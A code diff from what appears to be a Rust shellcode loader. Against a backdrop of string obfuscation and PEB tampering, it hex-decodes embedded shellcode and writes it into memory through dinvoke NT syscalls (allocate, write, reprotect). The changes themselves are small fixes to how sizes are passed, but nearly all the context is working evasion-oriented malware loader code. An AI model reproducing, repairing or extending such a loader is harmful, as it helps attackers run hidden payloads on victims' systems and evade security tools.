@@ -4,7 +4,7 @@ use_litcrypt!();
 
 use windows::Win32::{System::{Threading::{PROCESS_BASIC_INFORMATION, PEB}, WindowsProgramming::LDR_DATA_TABLE_ENTRY, Kernel::LIST_ENTRY}, Foundation::HANDLE};
 use data::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, _INVERTED_FUNCTION_TABLE, PAGE_READONLY };
-use std::ffi::c_void;
+use std::{ffi::c_void, cell::UnsafeCell};
 use std::mem::size_of;
 use std::ptr::{self};
 
@@ -19,6 +19,7 @@ fn get_sh() -> String
 #[no_mangle]
 fn run() -> bool
 {
+    #![allow(invalid_reference_casting)]
     unsafe
     {        
         restore_peb();
@@ -31,8 +32,8 @@ fn run() -> bool
         let zero_bits = 0 as usize;
         let sh = get_sh();
         let decoded_sh =  hex::decode(sh).expect("");
-        let sh_size = decoded_sh.len();
-        let size: *mut usize = std::mem::transmute(&sh_size);
+        let sh_size: UnsafeCell<usize> = decoded_sh.len().into(); // Not needed because invalid_reference_casting is enabled
+        let size: *mut usize = sh_size.get();
 
         let ret = dinvoke::nt_allocate_virtual_memory(
             phand, 
@@ -50,7 +51,8 @@ fn run() -> bool
         let base_address: *mut c_void = *base_address_shellcode;
         let written: usize = 0;
         let buffer: *mut c_void = std::mem::transmute(decoded_sh.as_ptr());
-        let nsize =  decoded_sh.len();
+        let nsize: UnsafeCell<usize> =  decoded_sh.len().into();
+        let nsize = *(nsize.get());
         let bytes_written: *mut usize = std::mem::transmute(&written);
         let ret = dinvoke::nt_write_virtual_memory(
             phand, 
@@ -64,9 +66,9 @@ fn run() -> bool
             return true;
         }
 
-        let size: *mut usize = std::mem::transmute(&isize::default());
-        *size = sh_size;
-        let old_protection: *mut u32 = std::mem::transmute(&u32::default());
+        let size: *mut usize = sh_size.get();
+        let o = u32::default();
+        let old_protection: *mut u32 = std::mem::transmute(&o);
         let ret = dinvoke::nt_protect_virtual_memory(
             phand, 
             base_address_shellcode, 
